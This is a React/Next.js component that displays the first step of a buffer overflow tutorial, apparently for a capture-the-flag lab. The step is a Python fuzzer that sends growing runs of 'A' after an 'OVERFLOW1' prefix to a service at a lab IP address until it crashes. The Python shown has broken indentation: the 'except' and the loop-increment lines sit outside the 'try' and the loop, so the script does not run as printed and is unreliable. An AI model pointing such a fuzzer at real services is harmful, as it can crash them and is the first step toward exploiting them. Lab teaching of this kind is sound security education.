import {
  Typography,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Box,
} from "@mui/material";
import Link from "next/link";
import SyntaxHighlighter from "react-syntax-highlighter";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import Image from "next/image";

interface IProps {
  title: string;
}

const BufferOverflowStep1 = ({ title }: IProps) => {
  return (
    <>
      {" "}
      <Accordion sx={{ backgroundColor: "primary.main" }}>
        <AccordionSummary
          expandIcon={<ExpandMoreIcon />}
          aria-controls="panel1a-content"
          id="panel1a-header"
        >
          <Typography>{title}</Typography>
        </AccordionSummary>
        <AccordionDetails
          sx={{ backgroundColor: "primary.background_accordian" }}
        >
          <Typography
            sx={{
              color: "primary.main",
            }}
          >
            <Typography variant="h6">1-Fuzzer.py</Typography>
            <Typography>
              This program will give us a general idea of where the program
              crashes at.
            </Typography>
            <SyntaxHighlighter className="syntax" language="python">
              {"#!/usr/bin/env python3\n\n" +
                "import socket, time, sys\n\n" +
                'ip = "10.10.189.218"\n\n' +
                "port = 1337\n" +
                "timeout = 5\n" +
                'prefix = "OVERFLOW1 "\n\n' +
                'string = prefix + "A" * 100\n\n' +
                "while True:\n" +
                "  try:\n" +
                "    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n" +
                "      s.settimeout(timeout)\n" +
                "      s.connect((ip, port))\n" +
                "      s.recv(1024)\n" +
                '      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))\n' +
                '      s.send(bytes(string, "latin-1"))\n' +
                "      s.recv(1024)\n" +
                "except:\n" +
                '  print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))\n' +
                "  sys.exit(0)\n" +
                'string += 100 * "A"\n' +
                "time.sleep(1)"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Example Output</Typography>
            <Image src="/Step1.png" height={185} width={436} />
          </Typography>
        </AccordionDetails>
      </Accordion>
    </>
  );
};

export default BufferOverflowStep1;
